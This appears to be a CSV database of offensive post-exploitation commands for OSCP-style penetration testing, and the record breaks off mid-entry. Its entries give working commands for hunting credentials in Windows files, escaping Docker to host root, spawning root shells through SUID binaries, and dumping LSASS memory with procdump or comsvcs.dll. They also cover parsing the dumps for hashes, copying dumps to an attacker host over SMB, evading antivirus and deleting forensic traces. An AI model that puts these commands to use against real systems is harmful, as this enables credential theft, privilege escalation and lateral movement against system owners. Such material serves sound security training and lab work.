"ps-search-credentials","PowerShell Search Files for Credentials","post-exploit","Get-ChildItem -Path <SEARCH_PATH> -Include <PATTERNS> -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern <KEYWORD>","One-liner commands to search Windows filesystem for credential-containing files","CREDENTIAL_HARVESTING","Get-ChildItem -Path C:\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password","","","[{""command"": ""Get-ChildItem -Path C:\\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'"", ""description"": ""Search all user directories for files containing the word 'password'"", ""context"": ""Broad credential hunting""}, {""command"": ""Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.inf,sysprep.xml -Recurse -ErrorAction SilentlyContinue"", ""description"": ""Find Windows deployment answer files (often contain cleartext admin passwords)"", ""context"": ""Windows unattend file credential disclosure""}, {""command"": ""Get-Content C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"", ""description"": ""Read PowerShell command history for all users (may contain credentials in commands)"", ""context"": ""PowerShell history credential disclosure""}, {""command"": ""Get-ChildItem -Path C:\\inetpub\\wwwroot -Include web.config -Recurse | Select-String -Pattern 'connectionString'"", ""description"": ""Search IIS web roots for database connection strings in web.config files"", ""context"": ""Web application credential extraction""}, {""command"": ""Get-ChildItem -Path C:\\Users -Include *.kdbx,*.key -Recurse -ErrorAction SilentlyContinue"", ""description"": ""Search for KeePass password database files"", ""context"": ""Password manager database discovery""}, {""command"": ""dir C:\\Users\\*\\Desktop\\*.txt | Select-String -Pattern 'password|username|login'"", ""description"": ""Search desktop text files for credential-related keywords"", ""context"": ""Quick desktop credential check""}]","{""purpose"": ""Automate credential harvesting from common Windows file locations and configuration files after gaining initial access"", ""manual_alternative"": ""Manual file browsing via File Explorer (extremely time-consuming and error-prone)"", ""common_failures"": [""Forgetting -ErrorAction SilentlyContinue causes search to halt on access denied errors"", ""Searching C:\\ without filters takes too long (narrow search path and file types)"", ""Select-String is case-insensitive by default - use -CaseSensitive if needed"", ""Large result sets flood console - pipe to | Out-File results.txt to save output""], ""when_to_use"": [""After gaining user-level access, searching for privilege escalation credentials"", ""Hunting for database credentials in web application configs"", ""Finding deployment/configuration files with hardcoded passwords"", ""OSCP post-exploitation credential hunting phase""], ""exam_relevance"": ""MEDIUM-HIGH - Credential reuse is common in OSCP labs. Found credentials often enable lateral movement or privilege escalation."", ""time_estimate"": ""30 seconds to 5 minutes depending on search scope"", ""technical_notes"": [""Select-String is PowerShell's grep equivalent (searches file contents)"", ""Get-ChildItem (alias: dir, ls, gci) finds files by name/pattern"", ""-ErrorAction SilentlyContinue required when searching restricted directories"", ""Pipe results to Select-Object Filename,LineNumber,Line for cleaner output"", ""Common credential file locations: C:\\inetpub, C:\\xampp, C:\\Users\\*\\AppData""]}","[""ps-registry-autologon"", ""ps-search-desktop-flags"", ""grep-recursive-search""]","","","","",""
"check-docker-group","Check Docker Group Membership","post-exploit","groups && id","Verify current user is in docker group (prerequisite for docker escape)","docker-escape","","Docker group membership = root-equivalent access.

If user is in docker group, privilege escalation is trivial.","high","","","","","{""groups"": ""Display all groups current user belongs to"", ""id"": ""Show user ID, group ID, and all group memberships with IDs""}","","","[""check-docker-socket"", ""list-docker-images""]"
"check-docker-socket","Check Docker Socket Access","post-exploit","ls -la /var/run/docker.sock && docker ps 2>/dev/null","Verify access to Docker socket and test if docker commands work","docker-escape","","Socket access confirms docker group membership is effective.

Even if no containers are running, docker commands working means escalation is possible.","high","","","","","{""ls -la"": ""Show socket permissions and ownership"", ""/var/run/docker.sock"": ""Unix socket Docker daemon listens on"", ""docker ps"": ""List running containers (tests docker access)"", ""2>/dev/null"": ""Hide errors if docker command fails""}","[""check-docker-group""]","","[""list-docker-images"", ""docker-mount-escape""]"
"list-docker-images","List Available Docker Images","post-exploit","docker images","Enumerate available Docker images for container escape","docker-escape","","If no images available, can pull alpine (smallest):
docker pull alpine.

However, may be noisy/logged.

Prefer using existing images.","high","","","","","{""docker images"": ""Show all locally cached Docker images""}","[""check-docker-socket""]","","[""docker-mount-escape""]"
"docker-mount-escape","Docker Mount Escape to Root","post-exploit","docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt sh","Mount host filesystem in container and chroot to gain root access","docker-escape","docker run -v /:/mnt --rm -it alpine chroot /mnt sh","This is the cleanest Docker escape method.

Host filesystem is at /mnt.

All host files accessible as root.

Can read /mnt/root/.ssh/id_rsa, /mnt/etc/shadow, modify /mnt/etc/passwd, etc.","high","","","","{""Image not found"": ""Use docker pull alpine or docker pull ubuntu, or use existing image from docker images"", ""chroot fails"": ""Try without chroot: docker run -v /:/mnt --rm -it alpine sh, then navigate to /mnt manually"", ""Permission denied"": ""Verify docker group membership with groups command""}","{""-v /:/mnt"": ""Mount host root filesystem at /mnt inside container"", ""--rm"": ""Automatically remove container when it exits (cleanup)"", ""-it"": ""Interactive terminal with TTY allocation"", ""chroot /mnt"": ""Change root to mounted host filesystem"", ""sh"": ""Shell to spawn (use bash if available in image)""}","[""check-docker-socket"", ""list-docker-images""]","","[""verify-docker-root""]"
"verify-docker-root","Verify Root Access to Host","post-exploit","cat /mnt/etc/shadow && ls -la /mnt/root && cat /mnt/root/.ssh/id_rsa 2>/dev/null","Confirm full root access to host filesystem from container","docker-escape","","Once verified, you have complete control over host.

Can read any file, modify any file, plant backdoors, extract all credentials.","high","","","","","{""cat /mnt/etc/shadow"": ""Read shadow file (root-only) to confirm access"", ""ls -la /mnt/root"": ""List root home directory contents"", ""cat /mnt/root/.ssh/id_rsa"": ""Attempt to read root SSH private key"", ""2>/dev/null"": ""Hide errors if SSH key doesn't exist""}","[""docker-mount-escape""]","",""
"docker-privileged-escape","Docker Privileged Container Escape","post-exploit","docker run --privileged -it <IMAGE_NAME> sh","Alternative Docker escape using privileged mode (more dangerous/noisy)","docker-escape","docker run --privileged -it alpine sh","Privileged mode is more powerful but noisier than mount escape.

Prefer docker-mount-escape for cleaner approach.","medium","","","","","{""--privileged"": ""Give extended privileges to container (access to all host devices)"", ""-it"": ""Interactive terminal""}","[""list-docker-images""]","[""docker-mount-escape""]",""
"docker-socket-mount","Docker Socket Mount Abuse","post-exploit","docker run -v /var/run/docker.sock:/var/run/docker.sock -it <IMAGE_NAME> sh","Mount Docker socket inside container to control host Docker daemon","docker-escape","docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh","Requires image with docker client installed.

More complex than direct mount escape.

Mainly useful if mount escape is blocked.","medium","","","","","{""-v /var/run/docker.sock:/var/run/docker.sock"": ""Mount host Docker socket inside container"", ""-it"": ""Interactive terminal""}","[""list-docker-images""]","[""docker-mount-escape""]",""
"docker-pull-alpine","Pull Alpine Docker Image","post-exploit","docker pull alpine","Download Alpine Linux image (smallest, fastest) for container escape","docker-escape","","May be logged/detected.

Prefer using existing images if available.

Alpine is only 5MB so downloads fast even on slow connections.","medium","","","","","{""docker pull"": ""Download image from Docker Hub"", ""alpine"": ""Minimal Linux distribution (5MB)""}","[""check-docker-socket""]","","[""docker-mount-escape""]"
"find-suid-binaries","Find SUID Binaries","post-exploit","find / -perm -4000 -type f 2>/dev/null","Locate all SUID binaries on filesystem (setuid bit allows execution with owner privileges)","linux-suid","","SUID bit allows file to execute with owner's privileges (usually root).

Misconfigured SUID binaries are common OSCP privilege escalation vector.","high","","","","{""Empty results"": ""Try: find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null"", ""Permission denied everywhere"": ""You may not have execute permissions on directories - try specific paths""}","{""/"": ""Start search from root directory (entire filesystem)"", ""-perm -4000"": ""Find files with SUID bit set (4 = SUID, represented in octal)"", ""-type f"": ""Only match regular files (not directories, symlinks, etc.)"", ""2>/dev/null"": ""Redirect stderr to /dev/null to suppress 'Permission denied' errors""}","","[""linux-suid-find""]","[""filter-suid-binaries"", ""gtfobins-suid-lookup""]"
"filter-suid-binaries","Filter Interesting SUID Binaries","post-exploit","find / -perm -4000 -type f 2>/dev/null | grep -vE '(passwd|sudo|pkexec|polkit|mount|umount|su|ping|ping6|fusermount|newgrp|chsh|chfn|gpasswd)'","Filter out standard system SUID binaries and identify potentially exploitable ones","linux-suid","","Standard system binaries (passwd, sudo, su) are SUID by design and rarely exploitable.

Focus on:
find, vim, nmap, base64, less, more, python, perl, awk, tar, zip, gzip.","high","","","","{""Everything filtered out"": ""Remove grep filter and manually review find output for unusual binaries"", ""grep not working"": ""Run find command alone and visually inspect for non-standard binaries""}","{""|"": ""Pipe output from find to grep filter"", ""grep -vE"": ""Invert match (-v) with extended regex (-E) to exclude patterns"", ""(pattern|pattern)"": ""Regex alternation - match any of these patterns""}","[""find-suid-binaries""]","","[""gtfobins-suid-lookup""]"
"gtfobins-suid-lookup","GTFOBins SUID Technique Lookup","post-exploit","echo 'Visit: https://gtfobins.github.io/ and search for binary name. Look for SUID section.'","Manual step: Lookup exploitation technique for discovered SUID binary on GTFOBins website","linux-suid","","GTFOBins is curated list of Unix binaries that can be exploited for privilege escalation.

SUID section shows commands that work when binary has setuid bit set.

Example:
/usr/bin/find .

-exec /bin/bash -p \; -quit","high","","","","{""Binary not on GTFOBins"": ""Try searchsploit or Google: '<binary-name> suid privilege escalation'"", ""No SUID section"": ""Check 'Shell' or 'File read' sections - may be adaptable""}","","[""filter-suid-binaries""]","",""
"execute-suid-exploit-find","Execute SUID Exploitation (find example)","post-exploit","/usr/bin/find . -exec /bin/bash -p \; -quit","Exploit SUID find binary to spawn privileged bash shell","linux-suid","","The -p flag is CRITICAL for bash to preserve elevated permissions.

Without it, bash drops privileges.

Other common SUID exploits:
vim -c ':!/bin/bash -p', nmap --interactive then !sh, base64 /etc/shadow | base64 -d","high","","","","{""Shell not privileged"": ""Ensure -p flag is used: /bin/bash -p (preserves SUID permissions)"", ""Binary not found"": ""Use full path from find output: $(which find) . -exec /bin/bash -p \\; -quit"", ""Permission denied"": ""Verify SUID bit: ls -la /usr/bin/find (should show -rwsr-xr-x)""}","{""/usr/bin/find"": ""Full path to SUID find binary (replace with discovered path)"", ""."": ""Search in current directory (required for find syntax)"", ""-exec"": ""Execute command for each file found"", ""/bin/bash -p"": ""Spawn bash with -p flag to preserve SUID privileges"", ""\\;"": ""Terminate -exec command (escaped semicolon)"", ""-quit"": ""Exit after first match (prevents multiple shell spawns)""}","[""gtfobins-suid-lookup""]","[""execute-suid-exploit-find"", ""execute-suid-exploit-find"", ""execute-sudo-exploit""]","[""verify-root-access-suid""]"
"verify-root-access-suid","Verify Root Privileges Obtained","post-exploit","whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'","Confirm effective UID is 0 (root) and can access root-only files","linux-suid","","Effective UID (euid) is what matters for permissions.

Even if real UID (uid) is not 0, euid=0 grants root privileges.

OSCP exam:
Take screenshot of whoami, id, and proof.txt contents for documentation.","high","","","","{""euid is 0 but uid is not"": ""Still have root privileges (effective UID). Can escalate further with: python -c 'import os; os.setuid(0); os.system(\""/bin/bash\"")'"", ""Cannot read /etc/shadow"": ""Privilege escalation failed. Ensure -p flag was used with bash: /bin/bash -p""}","{""whoami"": ""Display current effective username (should be 'root')"", ""id"": ""Show user/group IDs (should show uid=0 or euid=0)"", ""cat /etc/shadow"": ""Attempt to read shadow file (only root can read)"", ""> /dev/null 2>&1"": ""Redirect output and errors to null (silent test)"", ""&&"": ""AND operator - run next command only if previous succeeded"", ""||"": ""OR operator - run if previous command failed""}","[""execute-suid-exploit-find""]","[""cat-etc-shadow""]",""
"procdump-lsass-dump","Procdump LSASS Memory Dump","post-exploit",".\procdump64.exe -accepteula -ma lsass.exe lsass.dmp","Dump LSASS process memory using Microsoft Sysinternals procdump64.exe. Creates full memory dump containing credentials for offline parsing. Bypasses AV detection of Mimikatz by using legitimate Microsoft-signed debugging tool. Essential OSCP technique when Mimikatz.exe blocked.","credential-harvesting","","OSCP METHODOLOGY: Procdump is ESSENTIAL for OSCP when Windows Defender enabled (default on modern Windows). CRITICAL WORKFLOW: (1) Upload procdump64.exe to target. (2) Dump LSASS memory. (3) Download dump to Kali. (4) Parse offline with pypykatz. This bypasses all on-target AV while achieving same credential extraction as Mimikatz.

TIME ESTIMATE: 2-5 minutes total (30 sec upload procdump, 30-60 sec dump LSASS, 2-4 min download 40-200MB dump, 30 sec parse)

MANUAL ALTERNATIVES:
1. Task Manager dump (GUI):
   - Open Task Manager (Ctrl+Shift+Esc)
   - Details tab  Right-click lsass.exe  Create dump file
   - Dump saved to C:\Users\<USER>\AppData\Local\Temp\lsass.DMP
   - Advantage: No tool upload, built-in Windows feature
   - Disadvantage: Requires GUI access (RDP), not scriptable

2. Comsvcs.dll (no upload required):
   - See comsvcs-lsass-dump command
   - Uses built-in Windows DLL
   - rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full

3. Nanodump (alternative to procdump):
   - Modern C alternative, smaller binary (~60KB vs 500KB)
   - nanodump.exe --write lsass.dmp

PROCDUMP VS MIMIKATZ DIRECT:
Procdump + Offline Parsing:
  - Pros: Bypasses AV (Microsoft-signed), legitimate tool, no Mimikatz on target
  - Cons: Requires dump transfer (40-200MB), two-step process, offline parsing needed
  - Detection: Low (legitimate debugging activity)
  - OSCP Use: DEFAULT method when AV present

Mimikatz Direct:
  - Pros: One-step extraction, instant results, no file transfer
  - Cons: Heavily signatured (blocked by Defender), suspicious binary
  - Detection: High (immediate AV alert)
  - OSCP Use: Only when AV disabled or obfuscated Mimikatz available

OSCP EXAM TIPS:
1. Test Windows Defender status FIRST: Get-MpPreference | Select-Object DisableRealtimeMonitoring
2. If True (disabled): Use Mimikatz directly (faster)
3. If False (enabled): Use procdump + offline parsing (AV bypass)
4. Upload procdump64.exe to C:\Windows\Temp\ or C:\ProgramData\ (common writable paths)
5. Dump to same directory for easy cleanup: .\procdump64.exe -accepteula -ma lsass.exe .\lsass.dmp
6. Download dump immediately (don't leave 200MB artifact on target)
7. Delete dump after download: del lsass.dmp (cleanup)
8. Parse on Kali: pypykatz lsa minidump lsass.dmp > creds.txt

FILE TRANSFER STRATEGIES:
1. Evil-WinRM (default): download lsass.dmp (40-200MB, may be slow)
2. SMB (fastest for large files):
   Kali: impacket-smbserver share . -smb2support
   Windows: copy lsass.dmp \\<KALI_IP>\share\
3. Compress first (reduce size 70-80%):
   Windows: Compress-Archive lsass.dmp lsass.zip
   Download: download lsass.zip (10-40MB, much faster)
   Kali: unzip lsass.zip && pypykatz lsa minidump lsass.dmp

DETECTION NOTES:
- Event ID 4656: Handle to process (may log LSASS access if auditing enabled)
- Event ID 4663: Object access attempt (process memory read)
- Procdump execution visible in Event ID 4688 (process creation) if logging enabled
- LSASS memory dump is SIEM alert trigger in mature environments
- Dump file on disk is forensic artifact (delete after download)
- Offline parsing on Kali generates no target system events

COMMON MISTAKES:
1. Using -mm (minimal) instead of -ma (full) - misses credentials
2. Not using -accepteula - causes interactive prompt in remote shell (hangs)
3. Leaving dump file on target after extraction (forensic evidence)
4. Attempting download without compressing (slow for 200MB file)
5. Not checking LSASS PID first (using wrong PID)
6. Dumping to non-writable directory (C:\ requires admin, use C:\Temp or C:\Windows\Temp)

ADVANCED USAGE:
- Dump by PID: tasklist /fi ""imagename eq lsass.exe""  procdump64.exe -accepteula -ma <PID> lsass.dmp
- Multiple dumps: procdump64.exe -accepteula -ma -n 3 lsass.exe lsass.dmp (3 dumps for analysis)
- Compress on target: procdump64.exe -ma lsass.exe - | 7z a -si lsass.7z (pipe to 7zip)
- Remote dump via PsExec: PsExec.exe \\<TARGET> -s procdump64.exe -accepteula -ma lsass.exe C:\lsass.dmp

CREDENTIAL GUARD WORKAROUNDS:
If Credential Guard enabled (blocks LSASS memory access):
1. DCSync (if Domain Admin): Extract credentials from Domain Controller instead
2. SAM/LSA Secrets: Use lsadump::sam and lsadump::secrets (registry-based, not memory)
3. Kerberos tickets: Extract tickets (may still work with Credential Guard)
4. Pass-the-Hash: Use NTLM hashes without plaintext (PtH attacks still viable)
5. Kerberoasting: Extract service account hashes (doesn't touch LSASS)","high","","","","{""Access is denied / Error opening lsass.exe"": ""Not running with local administrator privileges. Solution: Verify admin rights: whoami /groups | findstr Administrators. Must see 'BUILTIN\\Administrators' with 'Mandatory Label\\High Mandatory Level'. If using Evil-WinRM, ensure authenticated as local admin. Alternative: Use PsExec to get SYSTEM shell: PsExec.exe -s -i cmd.exe, then run procdump from SYSTEM context."", ""Protected Process error"": ""LSASS running as Protected Process Light (PPL) or Credential Guard enabled. Detection: LSASS process has 'Protected' attribute (check with Process Explorer or Get-Process lsass | Select-Object Protection). Solution: (1) Disable PPL: Requires kernel driver (mimidrv.sys, PPLKiller) OR reboot to disable. (2) Use alternative: comsvcs.dll method (may bypass PPL in some configurations). (3) DCSync if Domain Admin available (avoids local LSASS). OSCP TIP: If Credential Guard enabled, pivot to registry dumps (SAM/LSA Secrets) or DCSync."", ""Dump file size is 0 KB or very small"": ""Dump failed but didn't report error. Causes: (1) LSASS process terminated during dump. (2) Insufficient disk space. (3) Antivirus quarantined dump mid-creation. Solution: Verify disk space: dir C:\\ (check free space >500MB). Retry dump to different location: procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp. Check AV: Get-MpPreference | Select-Object DisableRealtimeMonitoring (should be True if disabled)."", ""Want to download dump but Evil-WinRM download slow"": ""LSASS dump 40-200MB, Evil-WinRM download can be slow over WAN. Alternative transfer methods: (1) SMB: Setup Impacket SMB server on Kali, copy from Windows: copy lsass.dmp \\\\<KALI_IP>\\share\\. (2) HTTP upload: Setup uploadserver on Kali, PowerShell upload from Windows. (3) Split file: Use 7zip to compress (lsass.7z ~10-30MB), then download. (4) FTP: Setup FTP server on Kali if other methods blocked. OSCP TIP: SMB copy is usually fastest for large files.""}","{""procdump64.exe"": ""Microsoft Sysinternals legitimate debugging tool for creating process memory dumps. LEGITIMACY: Part of Sysinternals suite, Microsoft-signed binary, used by IT administrators for troubleshooting application crashes. WHY AV BYPASS: Procdump itself is benign - creates memory dumps for any process. Using it for LSASS is suspicious but not blocked by most AV. No credential extraction happens on target (only memory copy). Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump OR Evil-WinRM upload."", ""-accepteula"": ""Auto-accept End User License Agreement (EULA). Suppresses interactive EULA prompt on first run. REQUIRED FOR AUTOMATION: Without this flag, procdump displays EULA popup requiring manual acceptance (breaks remote shells). Always include in command-line execution. Not required for subsequent runs (EULA acceptance persists in registry)."", ""-ma"": ""Full memory dump (include all accessible memory - kernel and user). ALTERNATIVE FLAGS: -mm (minimal dump - smaller file, may miss credentials). -ma is CRITICAL for credential extraction because LSASS credentials scattered throughout process memory. Minimal dumps may miss passwords in specific memory regions. OSCP TIP: Always use -ma for complete credential extraction. File size: 40-200MB depending on LSASS memory footprint."", ""lsass.exe"": ""Target process name (Local Security Authority Subsystem Service). ALTERNATIVES: Use PID instead of name: procdump64.exe -ma <PID> lsass.dmp. Find LSASS PID: tasklist /fi \""imagename eq lsass.exe\"" OR Get-Process lsass | Select-Object Id. Using PID prevents name confusion (only one lsass.exe, but explicit PID is clearer). Example: procdump64.exe -ma 612 lsass.dmp (if lsass PID = 612)."", ""lsass.dmp"": ""Output filename for memory dump. NAMING: Use descriptive names for multiple systems: <HOSTNAME>_lsass.dmp OR <IP>_lsass_<DATE>.dmp. Example: WEB01_lsass.dmp. LOCATION: Dumps to current working directory by default. Specify full path: C:\\Temp\\lsass.dmp. FILE SIZE: 40-200MB typically. OPSEC: Clean up dump file after download (del lsass.dmp) to remove forensic artifact.""}","","[""comsvcs-lsass-dump"", ""mimikatz-sekurlsa-logonpasswords""]","[""pypykatz-parse-lsass"", ""evil-winrm-download-file""]"
"pypykatz-parse-lsass","Pypykatz Parse LSASS Dump Offline","post-exploit","pypykatz lsa minidump lsass.dmp","Parse LSASS memory dump offline on Kali using pypykatz (Python-based Mimikatz alternative). Extracts NTLM hashes, plaintext passwords, Kerberos tickets from procdump/comsvcs dump files. Pure Python implementation (no Wine/Windows required). Essential for offline credential analysis.","credential-harvesting","","OSCP METHODOLOGY: Pypykatz is the STANDARD tool for parsing LSASS dumps on Kali. CRITICAL WORKFLOW: Windows (procdump)  Transfer dump to Kali  Parse with pypykatz  Extract credentials. This is the most OPSEC-friendly approach for credential harvesting.

TIME ESTIMATE: 10-30 seconds (5-10 sec file parsing, 5-20 sec analyzing output)

MANUAL ALTERNATIVES:
1. Mimikatz on Windows (parse dump on Windows VM):
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonpasswords
   Advantage: Official Mimikatz (100% compatible)
   Disadvantage: Requires Windows VM or Wine (complex setup)

2. Invoke-Mimikatz PowerShell (remote parsing):
   IEX (New-Object Net.WebClient).DownloadString('Invoke-Mimikatz.ps1')
   Invoke-Mimikatz -DumpFilePath lsass.dmp
   Advantage: Parse on Windows without Mimikatz.exe
   Disadvantage: Requires PowerShell, larger footprint

3. Impacket secretsdump (for registry hives, not LSASS dumps):
   impacket-secretsdump -sam sam.save -system system.save LOCAL
   Note: Different use case (registry files, not memory dumps)

PYPYKATZ VS MIMIKATZ:
Pypykatz (Linux):
  - Pros: Native Linux, no AV issues, offline analysis, open-source
  - Cons: Occasional parsing differences, may miss some credential types
  - OSCP Use: DEFAULT for offline dump parsing

Mimikatz (Windows):
  - Pros: Official tool, 100% compatibility, all features
  - Cons: Requires Windows/Wine, AV signatures, more complex setup
  - OSCP Use: Direct on-target extraction (if AV disabled)

OSCP EXAM TIPS:
1. Parse dumps immediately after download (verify credentials before cleanup)
2. Save output to file: pypykatz lsa minidump lsass.dmp > creds.txt (reference later)
3. Look for Domain Admin sessions: grep -i ""domain admins"" creds.txt
4. Extract NTLM hashes for Pass-the-Hash: grep ""NT:"" creds.txt | sort -u
5. Check for plaintext passwords: grep ""password"" creds.txt (WDigest on old systems)
6. Parse multiple dumps: for f in *.dmp; do pypykatz lsa minidump $f >> all_creds.txt; done
7. Organize by system: mkdir creds && pypykatz lsa minidump WEB01_lsass.dmp > creds/WEB01.txt

CREDENTIAL EXTRACTION WORKFLOW:
1. Download LSASS dump to Kali: Evil-WinRM  download lsass.dmp
2. Parse with pypykatz: pypykatz lsa minidump lsass.dmp | tee creds.txt
3. Extract NTLM hashes: grep ""NT:"" creds.txt | awk '{print $2}' | sort -u > ntlm_hashes.txt
4. Extract usernames: grep ""username"" creds.txt | awk '{print $2}' | sort -u > users.txt
5. Extract domains: grep ""domainname"" creds.txt | awk '{print $2}' | sort -u > domains.txt
6. Create user:hash pairs: paste -d: users.txt ntlm_hashes.txt > user_hash_pairs.txt
7. Pass-the-Hash: crackmapexec smb <TARGETS> -u users.txt -H ntlm_hashes.txt --no-bruteforce

OUTPUT INTERPRETATION:
=== AUTHENTICATION PACKAGES ===
msv:
  - Contains NTLM hashes (LM and NT)
  - Example: NT: 8846f7eaee8fb117ad06bdd830b7586c
  - Use for Pass-the-Hash attacks

kerberos:
  - Kerberos tickets (TGT/TGS)
  - Ticket lifetimes, encryption types, service principals
  - Export tickets for Pass-the-Ticket

wdigest:
  - Plaintext passwords (if WDigest enabled)
  - Disabled by default on Windows 8.1+/2012 R2+
  - If found, immediate win (plaintext domain passwords)

tspkg:
  - RDP/TS credentials
  - Usually same as msv (NTLM hashes)

=== LOGON SESSIONS ===
logon_id: Unique session identifier (LUID)
logontype: Interactive (2), Service (5), Network (3), RemoteInteractive (10/RDP)
username: Account name
domainname: Domain or WORKGROUP for local

PRIORITY TARGETS:
HIGH VALUE FINDS:
1. Domain Admin credentials: domainname = <DOMAIN>, username in 'Domain Admins' group
2. Service account plaintext: High-privilege service accounts (sql_service, backup_admin)
3. Multiple domain users: Lateral movement opportunities
4. Kerberos TGT: Pass-the-Ticket for any service

DETECTION NOTES:
- Pypykatz parsing on Kali generates ZERO events on target system (100% offline)
- No network traffic to target during parsing
- OPSEC ADVANTAGE: All analysis happens on attacker infrastructure
- Target only sees: LSASS dump creation (procdump execution) + file download (if monitored)

COMMON MISTAKES:
1. Not saving pypykatz output (re-parsing large dumps is slow)
2. Parsing wrong file (ensure lsass.dmp, not other process dump)
3. Not organizing multi-system dumps (label by hostname/IP)
4. Missing plaintext passwords in output (WDigest section - rare but high value)
5. Not extracting Kerberos tickets (can be exported for Pass-the-Ticket)

ADVANCED USAGE:
- Batch parsing: for dump in *.dmp; do echo ""=== $dump ===""; pypykatz lsa minidump $dump; done > all.txt
- JSON output: pypykatz lsa minidump lsass.dmp -o json | jq '.logon_sessions' > sessions.json
- Kerberos ticket export: pypykatz lsa minidump lsass.dmp --kerberos-dir ./tickets/
- Registry parsing: pypykatz registry --sam sam.save --system system.save
- Recursive parsing: pypykatz lsa minidump lsass.dmp --packages all (all auth packages)

COMPATIBILITY NOTES:
- Works with dumps from: procdump, Task Manager, comsvcs.dll, Process Hacker, nanodump
- Supports all Windows versions: XP through Windows 11, Server 2003 through 2022
- Parses both 32-bit and 64-bit dumps
- Occasional issues with very old dumps (pre-Windows 7) - use Mimikatz fallback","high","","","","{""Module not found: pypykatz"": ""Pypykatz not installed on Kali. Solution: Install with: sudo apt update && sudo apt install pypykatz -y OR pip3 install pypykatz --user. Verify installation: pypykatz --help (should display usage). Kali 2022+ includes pypykatz by default. Older Kali: use pip3 method."", ""Not a valid minidump file"": ""Dump file corrupted during transfer or created incorrectly. Causes: (1) Incomplete download (file transfer interrupted). Solution: Verify file size on Windows matches Kali: Windows: dir lsass.dmp, Kali: ls -lh lsass.dmp. Re-download if mismatch. (2) Wrong dump type (not full memory dump). Solution: Ensure procdump used -ma flag (full dump), not -mm (minimal). (3) File corruption. Solution: Re-create dump on target, transfer again with integrity check (MD5/SHA256)."", ""No credentials displayed / Empty output"": ""Dump is valid but contains no credentials. Causes: (1) No users were logged in at dump time (only SYSTEM). Solution: Normal for servers with only service logons. Check domainname field - if all entries show 'NT AUTHORITY', no domain users were active. (2) Credential Guard enabled (blocks credential caching). Solution: Credentials protected, pypykatz shows sessions but no passwords/hashes. Pivot to DCSync or registry dumps. (3) Dump created from wrong process. Solution: Verify dump is from lsass.exe (PID 600-800 typical), not another process."", ""Want JSON output for automation"": ""Pypykatz supports JSON format for scripting. Command: pypykatz lsa minidump lsass.dmp -o json > creds.json. Parse JSON with jq: jq '.logon_sessions[].msv_creds[].NThash' creds.json (extract NTLM hashes). Alternative formats: -o grep (grep-friendly), -o none (suppress output, useful with --outfile).""}","{""pypykatz"": ""Python implementation of Mimikatz credential extraction functionality. ADVANTAGES: (1) Runs natively on Linux (Kali, Ubuntu, etc.) without Wine or Windows VM. (2) Not flagged by Windows Defender (never executes on target). (3) Open-source, auditable code. (4) Actively maintained by SkelSec. INSTALLATION: Kali default (sudo apt install pypykatz) OR pip3 install pypykatz. CAPABILITIES: Parses LSASS dumps, SAM/LSA registry hives, Kerberos ccache files. Equivalent to Mimikatz sekurlsa::logonpasswords for offline analysis."", ""lsa minidump"": ""Subcommand for parsing LSA (LSASS) memory dumps. 'lsa' module = Local Security Authority credential extraction. 'minidump' format = Windows MiniDump format (.dmp files from procdump, Task Manager, comsvcs.dll). WHY MINIDUMP: Windows crash dumps and process dumps use standardized MiniDump format containing full or partial process memory. Pypykatz reads this format to extract credential structures (Kerberos, NTLM, WDigest, CredSSP, etc.) same as Mimikatz on Windows."", ""lsass.dmp"": ""Path to LSASS memory dump file created by procdump/comsvcs. TRANSFER FROM TARGET: Use Evil-WinRM 'download lsass.dmp', SMB copy, HTTP upload, or compress+download. FILE SIZE: 40-200MB typical. LOCATION: Can be anywhere on Kali filesystem. Example paths: ~/loot/target1/lsass.dmp, /tmp/lsass.dmp. MULTIPLE DUMPS: Parse each separately or use wildcards: pypykatz lsa minidump *.dmp"", ""Output Format"": ""Pypykatz output shows: (1) AUTHENTICATION PACKAGES: msv (NTLM), kerberos (tickets), wdigest (plaintext if enabled), tspkg (RDP), ssp (NTLM), livessp (Microsoft accounts). (2) LOGON SESSIONS: SID, logontype (Interactive, Service, Network), username, domainname. (3) CREDENTIALS: NTLM hash (32 hex chars), Plaintext password (if cached), SHA1 hash. (4) KERBEROS TICKETS: TGT/TGS tickets, lifetimes, encryption types. Output identical to Mimikatz sekurlsa::logonpasswords but parsed offline.""}","[""procdump-lsass-dump"", ""comsvcs-lsass-dump""]","[""mimikatz-sekurlsa-logonpasswords""]","[""hashcat-crack-ntlm"", ""pth-cme-exec""]"
"comsvcs-lsass-dump","Comsvcs.dll LSASS Dump (No Tool Upload)","post-exploit","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full","Dump LSASS memory using Windows built-in comsvcs.dll DLL via rundll32. No tool upload required (completely native Windows technique). Creates full LSASS memory dump identical to procdump. Excellent AV evasion because comsvcs.dll is legitimate Windows component for COM+ Services debugging.","credential-harvesting","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Temp\lsass.dmp full","OSCP METHODOLOGY: Comsvcs.dll technique is CRITICAL for OSCP when you cannot upload tools. ADVANTAGE: 100% native Windows technique using built-in DLL and rundll32. No binary upload = no AV signature detection. Identical dump quality to procdump.

TIME ESTIMATE: 30-60 seconds (10 sec find PID, 10 sec execute dump, 10-40 sec verify file created)

MANUAL ALTERNATIVES:
1. Procdump (requires upload):
   procdump64.exe -accepteula -ma lsass.exe lsass.dmp
   Advantage: Simpler syntax, better error messages
   Disadvantage: Requires tool upload (AV may flag)

2. Task Manager dump (requires GUI):
   Task Manager  Details  lsass.exe  Right-click  Create dump file
   Advantage: Point-and-click, no command line
   Disadvantage: Requires RDP access, not scriptable

3. PowerShell MiniDump (custom code):
